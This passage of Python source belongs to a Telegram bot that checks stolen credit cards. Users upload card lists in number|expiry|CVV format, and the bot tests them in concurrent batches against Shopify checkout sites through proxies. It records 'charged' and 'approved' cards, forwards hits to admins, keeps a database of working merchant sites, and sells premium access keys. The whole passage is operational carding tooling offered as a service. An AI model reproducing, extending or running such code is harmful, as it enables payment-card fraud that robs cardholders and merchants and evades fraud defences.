
                        display_site_index = "?"

                    if should_send_message:

                        card_msg = f"""{status_header}

    📂 **CC ⇾** `{card}`
    ⚡ **Gateway ⇾** {result.get('Gateway', 'Unknown')}
    ℹ️ **Response ⇾** {result.get('Response')}
    💸 **Price ⇾** {result.get('Price')} 💸
    📍 **Site ⇾** {display_site_index}

    ```BIN Info: {brand} - {bin_type} - {level}
    🏦 Bank: {bank}
    📍 Country: {country} {flag}```
    ⏳ **Took** {elapsed_time} seconds"""

                        result_msg = await event.reply(card_msg)

                        # Pin if charged

                        if "charged" in response_text_lower or "charged" in status_text_lower or "thank you" in response_text_lower or "payment successful" in response_text_lower:

                            await pin_charged_message(event, result_msg)
                            for admin_id in ADMIN_ID:
                                try: await client.send_message(admin_id, f"💎 **NEW CHARGED CC HIT (Mtxt Check)!** 💎\n\n{card_msg}")
                                except Exception as e: print(f"Failed to send hit to admin {admin_id}: {e}")

                

                    buttons = [

                        [Button.inline(f"Card ➜ {card[:12]}****", b"none")],

                        [Button.inline(f"Response ➜ {result.get('Response')[:25]}...", b"none")],

                        [Button.inline(f"Site ➜ [ {display_site_index} ]", b"none")],

                        [Button.inline(f"CHARGE ➜ [ {charged} ]", b"none", style="success", icon=4902715076873553054)],

                        [Button.inline(f"Approve ➜ [ {approved} ]", b"none", style="primary", icon=5084974483685507801)],

                    [Button.inline(f"Decline ➜ [ {declined} ] ❌", b"none", style="danger")],

                    [Button.inline(f"Progress ➜ [{checked}/{total}]", b"none", style="primary", icon=5980995951160987855)],

                    [Button.inline("Stop", f"stop_mtxt:{user_id}".encode(), style="danger", icon=5172739056592749710)]

                ]

                try: await status_msg.edit("**Cooking 🍳 CCs One by One...**", buttons=buttons)

                except: pass

                await asyncio.sleep(0.1)

        final_caption = f"""**✅ Checking Complete!

Total CHARGE 💎 : {charged}

Total Approve 🔥 : {approved}

Total Decline ❌ : {declined}

Total Checked ☠️ : {total}**

"""

        final_buttons = [
            [
                Button.inline(f"CHARGE ➜ [ {charged} ] 💎", b"none", style="success", icon=4902715076873553054),
                Button.inline(f"Approve ➜ [ {approved} ] ✅", b"none", style="primary", icon=5084974483685507801)
            ],
            [
                Button.inline(f"Decline ➜ [ {declined} ] ❌", b"none", style="danger"),
                Button.inline(f"Total Checked ➜ [{checked}/{total}] ✅", b"none")
            ]
        ]

        try: await status_msg.edit(final_caption, buttons=final_buttons)

        except: pass

    finally: ACTIVE_MTXT_PROCESSES.pop(user_id, None)

@client.on(events.CallbackQuery(pattern=rb"stop_mtxt:(\d+)"))

async def stop_mtxt_callback(event):

    try:

        match = event.pattern_match

        process_user_id = int(match.group(1).decode())

        clicking_user_id = event.sender_id

        can_stop = False

        if clicking_user_id == process_user_id: can_stop = True

        elif clicking_user_id in ADMIN_ID: can_stop = True

        if not can_stop: return await event.answer("```❌ You can only stop your own process!```", alert=True)

        if process_user_id not in ACTIVE_MTXT_PROCESSES: return await event.answer("```❌ No active process found!```", alert=True)

        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)

        await event.answer("```⛔ CC checking stopped!```", alert=True)

    except Exception as e: await event.answer(f"```❌ Error: {str(e)}```", alert=True)

@client.on(events.NewMessage(pattern='/info'))

async def info(event):

    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message())

    user = await event.get_sender()

    user_id = event.sender_id

    first_name = user.first_name or "N/A"

    last_name = user.last_name or ""

    full_name = f"{first_name} {last_name}".strip()

    username = f"@{user.username}" if user.username else "N/A"

    has_premium = await is_premium_user(user_id)

    premium_status = "✅ Premium Access" if has_premium else "❌ No Premium Access"

    sites = await load_json(SITE_FILE)

    user_sites = sites.get(str(user_id), [])

    if user_sites: sites_text = "\n".join([f"{idx + 1}. {site}" for idx, site in enumerate(user_sites)])

    else: sites_text = "No sites added"

    info_text = f"""👤 User Information

Name ⇾ {full_name}

Username ⇾ {username}

User ID ⇾ `{user_id}`

Pr  ivate Access ⇾ {premium_status}

Sites ⇾ ({len(user_sites)}):

```

{sites_text}

```

"""

    await event.reply(info_text)

@client.on(events.NewMessage(pattern='/stats'))

async def stats(event):

    if event.sender_id not in ADMIN_ID:

        return await event.reply("🚫 Only Admin Can Use This Command!")

    try:

        premium_users = await load_json(PREMIUM_FILE)

        free_users = await load_json(FREE_FILE)

        user_sites = await load_json(SITE_FILE)

        keys_data = await load_json(KEYS_FILE)

        stats_content = "🔥 BOT STATISTICS REPORT 🔥\n"

        stats_content += "=" * 50 + "\n\n"

        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        stats_content += f"📅 Generated on: {current_time}\n\n"

        stats_content += "👥 USER STATISTICS\n"

        stats_content += "-" * 30 + "\n"

        all_user_ids = set()

        all_user_ids.update(premium_users.keys())

        all_user_ids.update(free_users.keys())

        all_user_ids.update(user_sites.keys())

        total_users = len(all_user_ids)

        total_premium = len(premium_users)

        total_free = total_users - total_premium

        stats_content += f"📊 Total Unique Users: {total_users}\n"

        stats_content += f"💎 Premium Users: {total_premium}\n"

        stats_content += f"🆓 Free Users: {total_free}\n\n"

        if premium_users:

            stats_content += "💎 PREMIUM USERS DETAILS\n"

            stats_content += "-" * 30 + "\n"

            for user_id, user_data in premium_users.items():

                expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])

                current_date = datetime.datetime.now()

                status = "ACTIVE" if current_date <= expiry_date else "EXPIRED"

                days_remaining = (expiry_date - current_date).days if current_date <= expiry_date else 0

                stats_content += f"User ID: {user_id}\n"

                stats_content += f"  Status: {status}\n"

                stats_content += f"  Days Given: {user_data.get('days', 'N/A')}\n"

                stats_content += f"  Added By: {user_data.get('added_by', 'N/A')}\n"

                stats_content += f"  Expires: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n"

                stats_content += f"  Days Remaining: {days_remaining}\n"

                stats_content += "-" * 20 + "\n"

        stats_content += "\n🌐 SITES STATISTICS\n"

        stats_content += "-" * 30 + "\n"

        total_sites_count = sum(len(sites) for sites in user_sites.values())

        users_with_sites = len([uid for uid, sites in user_sites.items() if sites])

        stats_content += f"📈 Total Sites Added: {total_sites_count}\n"

        stats_content += f"👤 Users with Sites: {users_with_sites}\n"

        if user_sites:

            stats_content += f"\nSites per User:\n"

            for user_id, sites in user_sites.items():

                if sites:

                    stats_content += f"  User {user_id}: {len(sites)} sites\n"

                    for site in sites:

                        stats_content += f"    - {site}\n"

        stats_content += f"\n🔑 KEYS STATISTICS\n"

        stats_content += "-" * 30 + "\n"

        total_keys = len(keys_data)

        used_keys = len([k for k, v in keys_data.items() if v.get('used', False)])

        unused_keys = total_keys - used_keys

        stats_content += f"🔢 Total Keys Generated: {total_keys}\n"

        stats_content += f"✅ Used Keys: {used_keys}\n"

        stats_content += f"⏳ Unused Keys: {unused_keys}\n"

        if keys_data:

            stats_content += f"\nKeys Details:\n"

            for key, key_data in keys_data.items():

                status = "USED" if key_data.get('used', False) else "UNUSED"

                used_by = key_data.get('used_by', 'N/A')

                days = key_data.get('days', 'N/A')

                created = key_data.get('created_at', 'N/A')

                used_at = key_data.get('used_at', 'N/A')

                stats_content += f"  Key: {key}\n"

                stats_content += f"    Status: {status}\n"

                stats_content += f"    Days Value: {days}\n"

                stats_content += f"    Created: {created}\n"

                if status == "USED":

                    stats_content += f"    Used By: {used_by}\n"

                    stats_content += f"    Used At: {used_at}\n"

                stats_content += "-" * 15 + "\n"

        stats_content += f"\n👑 ADMIN STATISTICS\n"

        stats_content += "-" * 30 + "\n"

        stats_content += f"🛡️ Total Admins: {len(ADMIN_ID)}\n"

        stats_content += f"Admin IDs: {', '.join(map(str, ADMIN_ID))}\n"

        if os.path.exists(CC_FILE):

            try:

                async with aiofiles.open(CC_FILE, "r", encoding="utf-8") as f:

                    cc_content = await f.read()

                cc_lines = cc_content.strip().split('\n') if cc_content.strip() else []

                approved_cards = len([line for line in cc_lines if 'APPROVED' in line])

                charged_cards = len([line for line in cc_lines if 'CHARGED' in line])

                stats_content += f"\n💳 CARD STATISTICS\n"

                stats_content += "-" * 30 + "\n"

                stats_content += f"📊 Total Processed Cards: {len(cc_lines)}\n"

                stats_content += f"✅ Approved Cards: {approved_cards}\n"

                stats_content += f"💎 Charged Cards: {charged_cards}\n"

            except:

                pass

        stats_content += "\n" + "=" * 50 + "\n"

        stats_content += "📋 END OF REPORT 📋"

        stats_filename = f"bot_stats_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        async with aiofiles.open(stats_filename, "w", encoding="utf-8") as f:

            await f.write(stats_content)

        await event.reply("📊 Bot statistics report generated!", file=stats_filename)

        os.remove(stats_filename)

    except Exception as e:

        await event.reply(f"❌ Error generating stats: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]ran$'))

async def ranfor(event):

    can_access, access_type = await can_use(event.sender_id, event.chat)

    if access_type == "banned": return await event.reply(banned_user_message())

    if not can_access:

        buttons = [[Button.url("Use In Group Free", f"https://t.me/+ZZTpQdOeiEQwYTVl", style="primary")]]

        return await event.reply("🚫 Unauthorised Access!\n\nYou can use this bot in group for free!\n\nFor private access, contact @Rytce", buttons=buttons)

    

    # Check if user has added proxy

    proxy_data = await get_user_proxy(event.sender_id)

    if not proxy_data:

        return await event.reply("⚠️ Proxy Required!\n\nPlease add a proxy first using:\n`/addpxy ip:port:username:password`\n\nOr without auth:\n`/addpxy ip:port`")

    

    user_id = event.sender_id

    if user_id in ACTIVE_MTXT_PROCESSES: return await event.reply("**Your CC is already Cooking 🍳 wait for complete**")

    try:

        if not event.reply_to_msg_id: return await event.reply("```Please reply to a document message with /ran```")

        replied_msg = await event.get_reply_message()

        if not replied_msg or not replied_msg.document: return await event.reply("```Please reply to a document message with /ran```")

        

        # Load sites from sites.txt

        if not os.path.exists('/root/Antigravity/files/sites.txt'):

            return await event.reply("❌ Sites file not found! Contact admin.")

        

        async with aiofiles.open('/root/Antigravity/files/sites.txt', 'r') as f:

            sites_content = await f.read()

            global_sites = [line.strip() for line in sites_content.splitlines() if line.strip()]

        

        if not global_sites:

            return await event.reply("❌ No sites available in sites.txt! Contact admin.")

        

        file_path = await replied_msg.download_media()

        try:

            async with aiofiles.open(file_path, "r") as f: lines = (await f.read()).splitlines()

            os.remove(file_path)

        except Exception as e:

            try: os.remove(file_path)

            except: pass

            return await event.reply(f"❌ Error reading file: {e}")

        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]

        if not cards: return await event.reply("Any Valid CC not Found 🥲")

        cc_limit = get_cc_limit(access_type, user_id)

        total_cards_found = len(cards)

        if len(cards) > cc_limit:

            cards = cards[:cc_limit]

            status_msg = await event.reply(f"""**🍳 Found {total_cards_found} CCs in file

⚠️ Processing only first {cc_limit} CCs (your limit)

👑 {len(cards)} CCs will be checked**""")

        else:
            status_msg = await event.reply(f"""**🍳 Found {total_cards_found} valid CCs in file

👑 All {len(cards)} CCs will be checked**""")

        ACTIVE_MTXT_PROCESSES[user_id] = True

        asyncio.create_task(process_ranfor_cards(event, cards, global_sites.copy(), status_msg))

    except Exception as e:

        ACTIVE_MTXT_PROCESSES.pop(user_id, None)

        await event.reply(f"❌ Error: {e}")

async def process_ranfor_cards(event, cards, global_sites, status_msg):

    # Get username

    try:

        sender = await event.get_sender()

        username = sender.username if sender.username else f"user_{event.sender_id}"

    except:

        username = f"user_{event.sender_id}"

    

    user_id = event.sender_id

    total = len(cards)

    checked, approved, charged, declined = 0, 0, 0, 0

    # Reusing passed status_msg

    try:
        batch_size = 25
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=100)) as session:
            for i in range(0, len(cards), batch_size):

                if not global_sites:

                    await status_msg.edit("❌ **All sites are dead!**\nPlease contact admin to add fresh sites.")

                    break

                batch = cards[i:i+batch_size]

                tasks = []

                task_cards = []

                if user_id not in ACTIVE_MTXT_PROCESSES:

                    final_caption = f"""**⛔ Checking Stopped!

    Total CHARGE 💎 : {charged}

    Total Approve 🔥 : {approved}

    Total Decline ❌ : {declined}

    Total Checked ☠️ : {checked}/{total}**

    """

                    final_buttons = [[Button.inline(f"CHARGE ➜ [ {charged} ]", b"none", style="success", icon=4902715076873553054)], [Button.inline(f"Approve ➜ [ {approved} ]", b"none", style="primary", icon=5084974483685507801)], [Button.inline(f"Stop ➜ [{checked}/{total}] ⛔", b"none")]]

                    try: await status_msg.edit(final_caption, buttons=final_buttons)

                    except: pass

                    return

                for card in batch:

                    if user_id not in ACTIVE_MTXT_PROCESSES or not global_sites:

                        break

                    current_site = random.choice(global_sites)

                    tasks.append(check_card_with_retries_ranfor(card, current_site, user_id, global_sites, session=session))

                    task_cards.append((card, current_site))

            

                if not tasks: continue

                results = await asyncio.gather(*tasks, return_exceptions=True)

                for j, (result, (card, site_used)) in enumerate(zip(results, task_cards)):

                    if user_id not in ACTIVE_MTXT_PROCESSES: break

                    if isinstance(result, Exception):

                        result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}

                    checked += 1

                    start_time = time.time()

                    end_time = time.time()

                    elapsed_time = round(end_time - start_time, 2)

                

                    response_text = result.get("Response", "")

                    response_text_lower = response_text.lower()

                    if is_site_dead(response_text):

                        declined += 1

                        # Don't remove sites from global_sites list for /ran command

                        # Sites in sites.txt should remain unchanged

                        continue

                    if "3d" in response_text_lower:

                        declined += 1

                        continue

                    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])

                    should_send_message = False

                    status_text_lower = result.get("Status", "").lower()

                

                    # Check for charged status

                    if "charged" in response_text_lower or "charged" in status_text_lower:

                        charged += 1

                        status_header = "CHARGED 💎"

                        await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))

                        should_send_message = True

                    elif "cloudflare bypass failed" in response_text_lower:

                        status_header = "CLOUDFLARE SPOTTED ⚠️"

                        result["Response"] = "Cloudflare spotted 🤡 change site or try again"

                        checked -= 1

                    elif "thank you" in response_text_lower or "payment successful" in response_text_lower:

                        charged += 1

                        status_header = "CHARGED 💎"

                        await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))

                        should_send_message = True

                    elif any(key in response_text_lower for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):

                        approved += 1

                        status_header = "APPROVED ✅"

                        await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))

                        should_send_message = True

                    else:

                        declined += 1

                        status_header = "~~ DECLINED ~~ ❌"

                    if should_send_message:

                        card_msg = f"""{status_header}

    📂 **CC ⇾** `{card}`
    ⚡ **Gateway ⇾** {result.get('Gateway', 'Unknown')}
    ℹ️ **Response ⇾** {result.get('Response')}
    💸 **Price ⇾** {result.get('Price')} 💸

    ```BIN Info: {brand} - {bin_type} - {level}
    🏦 Bank: {bank}
    📍 Country: {country} {flag}```
    ⏳ **Took** {elapsed_time} seconds"""

                        result_msg = await event.reply(card_msg)

                        # Pin if charged

                        if "charged" in response_text_lower or "charged" in status_text_lower or "thank you" in response_text_lower or "payment successful" in response_text_lower:

                            await pin_charged_message(event, result_msg)
                            for admin_id in ADMIN_ID:
                                try: await client.send_message(admin_id, f"💎 **NEW CHARGED CC HIT (Ran Check)!** 💎\n\n{card_msg}")
                                except Exception as e: print(f"Failed to send hit to admin {admin_id}: {e}")

                

                    buttons = [
                        [Button.inline(f"Card ➜ {card[:12]}****", b"none")],
                        [Button.inline(f"Response ➜ {result.get('Response')[:25]}...", b"none")],
                        [
                            Button.inline(f"CHARGE: {charged} 💎", b"none", style="success", icon=4902715076873553054),
                            Button.inline(f"Approve: {approved} ✅", b"none", style="primary", icon=5084974483685507801),
                            Button.inline(f"Decline: {declined} ❌", b"none", style="danger")
                        ],
                        [
                            Button.inline(f"Progress: {checked}/{total}", b"none", style="primary", icon=5980995951160987855),
                            Button.inline("Stop 🚫", f"stop_ranfor:{user_id}".encode(), style="danger", icon=5172739056592749710)
                        ]
                    ]

                    try: await status_msg.edit("**Cooking 🍳 CCs One by One...**", buttons=buttons)

                    except: pass

                    await asyncio.sleep(0.1)

            final_caption = f"""**✅ Checking Complete!

    Total CHARGE 💎 : {charged}

    Total Approve 🔥 : {approved}

    Total Decline ❌ : {declined}

    Total Checked ☠️ : {total}**

    """

            final_buttons = [
                [
                    Button.inline(f"CHARGE ➜ [ {charged} ] 💎", b"none", style="success", icon=4902715076873553054),
                    Button.inline(f"Approve ➜ [ {approved} ] ✅", b"none", style="primary", icon=5084974483685507801)
                ],
                [
                    Button.inline(f"Decline ➜ [ {declined} ] ❌", b"none", style="danger"),
                    Button.inline(f"Total Checked ➜ [{checked}/{total}] ✅", b"none")
                ]
            ]

            try: await status_msg.edit(final_caption, buttons=final_buttons)

            except: pass

    finally: ACTIVE_MTXT_PROCESSES.pop(user_id, None)

async def check_card_with_retries_ranfor(card, site, user_id, global_sites, max_retries=3, session=None):

    """Check a card with automatic retry up to max_retries times on site errors"""

    last_result = None

    

    for attempt in range(max_retries):

        result = await check_card_specific_site(card, site, user_id, session=session)

        

        # Check if site is dead

        if is_site_dead(result.get("Response", "")):

            # Don't remove sites from global_sites for /ran command

            # Just try with a new random site

            

            # If no more sites available, return dead

            if not global_sites:

                return {"Response": "All sites dead", "Price": "-", "Gateway": "Shopify", "Status": "Dead"}

            

            # Try with a new random site (without removing the dead one)

            site = random.choice(global_sites)

            last_result = result

            

            # Add a small delay before retry (except on last attempt)

            if attempt < max_retries - 1:

                await asyncio.sleep(0.5)

        else:

            # If no site error, return the result immediately

            return result

    

    # If all attempts failed with site errors, return as dead

    if last_result:

        return {"Response": f"Site errors on all attempts: {last_result.get('Response', 'Unknown')}", "Price": last_result.get('Price', '-'), "Gateway": "Shopify", "Status": "Dead"}

    

    # Fallback (should never reach here)

    return {"Response": "Max retries exceeded", "Price": "-", "Gateway": "Shopify", "Status": "Dead"}

@client.on(events.CallbackQuery(pattern=rb"stop_ranfor:(\d+)"))

async def stop_ranfor_callback(event):

    try:

        match = event.pattern_match

        process_user_id = int(match.group(1).decode())

        clicking_user_id = event.sender_id

        can_stop = False

        if clicking_user_id == process_user_id: can_stop = True

        elif clicking_user_id in ADMIN_ID: can_stop = True

        if not can_stop: return await event.answer("```❌ You can only stop your own process!```", alert=True)

        if process_user_id not in ACTIVE_MTXT_PROCESSES: return await event.answer("```❌ No active process found!```", alert=True)

        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)

        await event.answer("```⛔ CC checking stopped!```", alert=True)

    except Exception as e: await event.answer(f"```❌ Error: {str(e)}```", alert=True)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]check'))

async def check_sites(event):

    can_access, access_type = await can_use(event.sender_id, event.chat)

    if access_type == "banned":

        return await event.reply(banned_user_message())

    if not can_access:

        buttons = [

            [Button.url("Use In Group Free", f"https://t.me/+ZZTpQdOeiEQwYTVl", style="primary")]

        ]

        return await event.reply("🚫 Unauthorised Access!\n\nYou can use this bot in group for free!\n\nFor private access, contact @Rytce", buttons=buttons)

    # Check if user has added proxy

    proxy_data = await get_user_proxy(event.sender_id)

    if not proxy_data:

        return await event.reply("⚠️ Proxy Required!\n\nPlease add a proxy first using:\n`/addpxy ip:port:username:password`\n\nOr without auth:\n`/addpxy ip:port`")

    check_text = event.raw_text[6:].strip()

    if not check_text:

        buttons = [

            [Button.inline("Check My DB Sites", b"check_db_sites", style="primary", icon=5253652327734192243)]

        ]

        instruction_text = """🔍 **Site Checker**

IF you want to check sites then type:

`/check`

`1. https://example.com`

`2. https://site2.com`

`3. https://site3.com`

And if you want to check your DB sites and add working & remove not working sites, click below button:"""

        return await event.reply(instruction_text, buttons=buttons)

    sites_to_check = extract_urls_from_text(check_text)

    if not sites_to_check:

        return await event.reply("❌ No valid urls/domains found!\n\n💡 Example:\n`/check`\n`1. https://example.com`\n`2. site2.com`")

    total_sites_found = len(sites_to_check)

    if len(sites_to_check) > 10:

        sites_to_check = sites_to_check[:10]

        await event.reply(f"```⚠️ Found {total_sites_found} sites, checking only first 10 sites```")

    asyncio.create_task(process_site_check(event, sites_to_check))

async def process_site_check(event, sites):

    """Process site checking in background"""

    total_sites = len(sites)

    checked = 0

    working_sites = []

    dead_sites = []

    status_msg = await event.reply(f"```🔍 Checking {total_sites} sites...```")

    batch_size = 10

    for i in range(0, len(sites), batch_size):

        batch = sites[i:i+batch_size]

        tasks = []

        for site in batch:

            tasks.append(test_single_site(site, user_id=event.sender_id))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (site, result) in enumerate(zip(batch, results)):

            checked += 1

            if isinstance(result, Exception):

                result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}

            # Check if proxy is dead - stop checking and notify user

            if result["status"] == "proxy_dead":

                final_text = f"""⚠️ **Proxy Dead!**

{result['response']}

📊 **Progress Before Stop:**

🟢 Working Sites: {len(working_sites)}

🔴 Dead Sites: {len(dead_sites)}

📝 Checked: {checked}/{total_sites}"""

                try:

                    await status_msg.edit(final_text)

                except:

                    await event.reply(final_text)

                return

            if result["status"] == "working":

                working_sites.append({"site": site, "price": result["price"]})

            else:

                dead_sites.append({"site": site, "price": result["price"]})

            working_count = len(working_sites)

            dead_count = len(dead_sites)

            

            working_sites_text = ""

            if working_sites:

                working_sites_text = "✅ **Working Sites:**\n" + "\n".join(

                    [f"{idx}. `{s['site']}` - {s['price']}" for idx, s in enumerate(working_sites, 1)]

                ) + "\n"

            dead_sites_text = ""

            if dead_sites:

                dead_sites_text = "❌ **Dead Sites:**\n" + "\n".join(

                    [f"{idx}. `{s['site']}` - {s['price']}" for idx, s in enumerate(dead_sites, 1)]

                ) + "\n"

            status_text = (

                f"```🔍 Checking Sites...\n\n"

                f"📊 Progress: [{checked}/{total_sites}]\n"

                f"✅ Working: {working_count}\n"

                f"❌ Dead: {dead_count}\n\n"

                f"🔄 Current: {site}\n"

                f"📝 Status: {result['status'].upper()}\n"

                f"💰 Price: {result['price']}\n"

                f"```\n"

            )

            if working_sites_text or dead_sites_text:

                status_text += working_sites_text + dead_sites_text

            try:

                await status_msg.edit(status_text)

            except:

                pass

            await asyncio.sleep(0.1)

    final_text = f"""✅ **Site Check Complete!**

📊 **Results:**

🟢 Working Sites: {len(working_sites)}

🔴 Dead Sites: {len(dead_sites)}

"""

    if working_sites:

        final_text += "✅ **Working Sites:**\n"

        for idx, site_data in enumerate(working_sites, 1):

            final_text += f"{idx}. `{site_data['site']}` - {site_data['price']}\n"

        final_text += "\n"

    if dead_sites:

        final_text += "❌ **Dead Sites:**\n"

        for idx, site_data in enumerate(dead_sites, 1):

            final_text += f"{idx}. `{site_data['site']}` - {site_data['price']}\n"

        final_text += "\n"

    buttons = []

    if working_sites:

        # Store working sites in temporary dict with user_id as key

        TEMP_WORKING_SITES[event.sender_id] = [site_data['site'] for site_data in working_sites]

        buttons.append([Button.inline("➕ Add Working Sitees to DB", f"add_working:{event.sender_id}".encode(), style="success")])

    try:

        await status_msg.edit(final_text, buttons=buttons)

    except:

        await event.reply(final_text, buttons=buttons)

# Button callback handlers

@client.on(events.CallbackQuery(pattern=b"check_db_sites"))

async def check_db_sites_callback(event):

    user_id = event.sender_id

    user_sites = await get_user_sites(user_id)

    if not user_sites:

        return await event.answer("❌ You haven't added any sites yet!", alert=True)

    await event.answer("🔍 Starting DB site check...", alert=False)

    asyncio.create_task(process_db_site_check(event, user_sites))

async def process_db_site_check(event, user_sites):

    """Check user's DB sites and remove dead ones"""

    user_id = event.sender_id

    total_sites = len(user_sites)

    checked = 0

    working_sites = []

    dead_sites = []

    status_text = f"```🔍 Checking Your {total_sites} DB sites...```"

    await event.edit(status_text)

    batch_size = 10

    for i in range(0, len(user_sites), batch_size):

        batch = user_sites[i:i+batch_size]

        tasks = []

        for site in batch:

            tasks.append(test_single_site(site, user_id=user_id))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (site, result) in enumerate(zip(batch, results)):

            checked += 1

            if isinstance(result, Exception):

                result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}

            # Check if proxy is dead - stop checking and notify user

            if result["status"] == "proxy_dead":

                final_text = f"""⚠️ **Proxy Dead!**

{result['response']}

📊 **Progress Before Stop:**

🟢 Working Sites: {len(working_sites)}

🔴 Dead Sites: {len(dead_sites)}

📝 Checked: {checked}/{total_sites}"""

                try:

                    await event.edit(final_text)

                except:

                    pass

                return

            if result["status"] == "working":

                working_sites.append(site)

            else:

                dead_sites.append(site)

            working_count = len(working_sites)

            dead_count = len(dead_sites)

            status_text = f"""```🔍 Checking Your DB Sites...

📊 Progress: [{checked}/{total_sites}]

✅ Working: {working_count}

❌ Dead: {dead_count}

🔄 Current: {site}

📝 Status: {result['status'].upper()}```"""

            try:

                await event.edit(status_text)

            except:

                pass

            await asyncio.sleep(0.1)

    if dead_sites:

        sites_data = await load_json(SITE_FILE)

        sites_data[str(user_id)] = working_sites

        await save_json(SITE_FILE, sites_data)

    final_text = f"""✅ **DB Site Check Complete!**

📊 **Results:**

🟢 Working Sites: {len(working_sites)}

🔴 Dead Sites (Removed): {len(dead_sites)}

"""

    if working_sites:

        final_text += "✅ **Working Sites:**\n"

        for idx, site in enumerate(working_sites, 1):

            final_text += f"{idx}. `{site}`\n"

        final_text += "\n"

    if dead_sites:

        final_text += "❌ **Dead Sites (Removed):**\n"

        for idx, site in enumerate(dead_sites, 1):

            final_text += f"{idx}. `{site}`\n"

    try:

        await event.edit(final_text)

    except:

        pass

@client.on(events.CallbackQuery(pattern=rb"add_working:(\d+)"))

async def add_working_sites_callback(event):

    try:

        match = event.pattern_match

        callback_user_id = int(match.group(1).decode())

        if event.sender_id != callback_user_id:

            return await event.answer("❌ You can only add sites from your own check!", alert=True)

        # Get working sites from temporary storage

        working_sites = TEMP_WORKING_SITES.get(callback_user_id, [])

        

        if not working_sites:

            return await event.answer("❌ No working sites found! Please run /check again.", alert=True)

        sites_data = await load_json(SITE_FILE)

        user_sites = sites_data.get(str(callback_user_id), [])

        added_sites = []

        already_exists = []

        for site in working_sites:

            if site not in user_sites:

                user_sites.append(site)

                added_sites.append(site)

            else:

                already_exists.append(site)

        sites_data[str(callback_user_id)] = user_sites

        await save_json(SITE_FILE, sites_data)

        

        # Clear temporary storage after adding

        TEMP_WORKING_SITES.pop(callback_user_id, None)

        response_parts = []

        if added_sites:

            added_text = f"✅ **Added {len(added_sites)} New Sites:**\n"

            for site in added_sites:

                added_text += f"• `{site}`\n"

            response_parts.append(added_text)

        if already_exists:

            exists_text = f"⚠️ **{len(already_exists)} Sites Already Exist:**\n"

            for site in already_exists:

                exists_text += f"• `{site}`\n"

            response_parts.append(exists_text)

        if response_parts:

            response_text = "\n".join(response_parts)

            response_text += f"\n📊 **Total Sites in Your DB:** {len(user_sites)}"

        else:

            response_text = "ℹ️ All sites are already in your DB!"

        await event.answer("✅ Sites processed!", alert=False)

        current_text = event.message.text

        updated_text = current_text + f"\n\n🔄 **Update:**\n{response_text}"

        try:

            await event.edit(updated_text, buttons=None)

        except:

            await event.respond(response_text)

    except Exception as e:

        await event.answer(f"❌ Error: {str(e)}", alert=True)

@client.on(events.NewMessage(pattern='/unauth'))

async def unauth_user(event):

    if event.sender_id not in ADMIN_ID:

        return await event.reply("🚫 Only Admin Can Use This Command!")

    try:

        parts = event.raw_text.split()

        if len(parts) != 2:

            return await event.reply("Format: /unauth {user_id}")

        user_id = int(parts[1])

        if not await is_premium_user(user_id):

            return await event.reply(f"❌ User {user_id} does not have premium access!")

        success = await remove_premium_user(user_id)

        if success:

            await event.reply(f"✅ Premium access removed for user {user_id}!")

            try:

                await client.send_message(user_id, f"⚠️ Your Premium Access Has Been Revoked!\n\nYou can no longer use the bot in private chat.\n\nFor inquiries, contact @Rytce")

            except:

                pass

        else:

            await event.reply(f"❌ Failed to remove access for user {user_id}")

    except ValueError:

        await event.reply("❌ Invalid user ID!")

    except Exception as e:

        await event.reply(f"❌ Error: {e}")

@client.on(events.NewMessage(pattern='/ban'))

async def ban_user_command(event):

    if event.sender_id not in ADMIN_ID:

        return await event.reply("🚫 Only Admin Can Use This Command!")

    try:

        parts = event.raw_text.split()

        if len(parts) != 2:

            return await event.reply("Format: /ban {user_id}")

        user_id = int(parts[1])

        if await is_banned_user(user_id):

            return await event.reply(f"❌ User {user_id} is already banned!")

        await remove_premium_user(user_id)

        await ban_user(user_id, event.sender_id)

        await event.reply(f"✅ User {user_id} has been banned!")

        try:

            await client.send_message(user_id, f"🚫 You Have Been Banned!\n\nYou are no longer able to use this bot in private or group chat.\n\nFor appeal, contact @Rytce")

        except:

            pass

    except ValueError:

        await event.reply("❌ Invalid user ID!")

    except Exception as e:

        await event.reply(f"❌ Error: {e}")

@client.on(events.NewMessage(pattern='/unban'))

async def unban_user_command(event):

    if event.sender_id not in ADMIN_ID:

        return await event.reply("🚫 Only Admin Can Use This Command!")

    try:

        parts = event.raw_text.split()

        if len(parts) != 2:

            return await event.reply("Format: /unban {user_id}")

        user_id = int(parts[1])

        if not await is_banned_user(user_id):

            return await event.reply(f"❌ User {user_id} is not banned!")

        success = await unban_user(user_id)

        if success:

            await event.reply(f"✅ User {user_id} has been unbanned!")

            try:

                await client.send_message(user_id, f"🎉 You Have Been Unbanned!\n\nYou can now use this bot again in groups.\n\nFor private access, you will need to purchase a new key.")

            except:

                pass

        else:

            await event.reply(f"❌ Failed to unban user {user_id}")

    except ValueError:

        await event.reply("❌ Invalid user ID!")

    except Exception as e:

        await event.reply(f"❌ Error: {e}")

async def show_admin_panel(event, edit=False):
    admins = await get_admins()
    if event.sender_id not in admins:
        msg = "🚫 **Access Denied!** Only authorized admins can open the Admin Panel."
        if edit:
            await event.edit(msg)
        else:
            await event.reply(msg)
        return
        
